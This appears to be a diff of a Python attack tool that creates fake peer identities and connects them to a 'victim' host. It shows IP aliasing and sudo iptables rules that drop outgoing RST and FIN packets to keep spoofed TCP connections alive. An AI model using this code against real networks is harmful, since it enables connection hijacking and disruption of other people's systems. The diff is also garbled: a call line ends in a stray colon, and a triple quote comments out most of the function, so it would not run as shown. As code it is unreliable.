@@ -247,9 +247,28 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 # Reconnect a peer
 def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
-	the_socket.close()
-	if the_socket in identity_socket: identity_socket.remove(the_socket)
-	del the_socket
+
+	close_connection(the_socket, other_socket, src_ip, src_port, interface)
+	make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 3):
+	"""
+	src_port = random.randint(1024, 65535)
+	dst_port = victim_port
+	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
+
+	interface = ip_alias(src_ip)
+	identity_interface.append(interface)
+	if verbose: print(f'Successfully set up IP alias on interface {interface}')
+	if verbose: print('Resulting ifconfig interface:')
+	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
+
+	if verbose: print('Setting up iptables configurations')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
+	#the_socket.close()
+	#if the_socket in identity_socket: identity_socket.remove(the_socket)
+	#del the_socket
 
 	time.sleep(1)
 
@@ -289,6 +308,7 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 	create_task(True, 'Reconnected ' + src_ip, sniff_func, s, other_socket, src_ip, src_port, dst_ip, dst_port, interface)
 
 	print(f'Successfully reconnected ({dst_ip} : {dst_port})')
+	"""
 
 
 # Creates a fake connection to the victim
